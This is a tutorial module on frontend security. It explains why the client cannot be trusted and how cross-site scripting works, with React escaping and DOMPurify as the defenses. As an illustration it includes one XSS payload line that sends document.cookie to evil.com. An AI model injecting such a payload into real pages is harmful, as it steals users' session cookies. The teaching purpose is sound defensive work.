# Module 18: Frontend Security

## The Browser is a Hostile Environment

The most fundamental rule of frontend development is: **Never trust the client.** 
Everything you send to the browser (JavaScript, API keys, HTML) can be read, manipulated, and tampered with by the user. If your backend relies on the frontend to validate whether a user is an "Admin", your application is already compromised.

### Cross-Site Scripting (XSS)

XSS is the most common frontend vulnerability. It occurs when an application includes untrusted data in a web page without proper validation or escaping.

**The Attack:** 
Imagine a blog platform. An attacker leaves a comment, but instead of text, they type:
`<script>fetch('https://evil.com?cookie=' + document.cookie)</script>`
If the server saves this string, and the frontend blindly renders it as HTML, every single user who views that comment will unknowingly execute that script in their browser, sending their authentication cookies directly to the attacker.

**The Defense:**
1. **React's built-in defense:** React automatically escapes all variables inside JSX curly braces `{}`. If you render `<p>{userComment}</p>`, React converts the `<script>` tags into harmless literal strings (`&lt;script&gt;`).
2. **The Danger of `dangerouslySetInnerHTML`:** Sometimes you *must* render raw HTML (e.g., from a Markdown parser or a Rich Text Editor). If you use `dangerouslySetInnerHTML`, you bypass React's protection. You MUST run the HTML string through a sanitizer library like `DOMPurify` before rendering it.
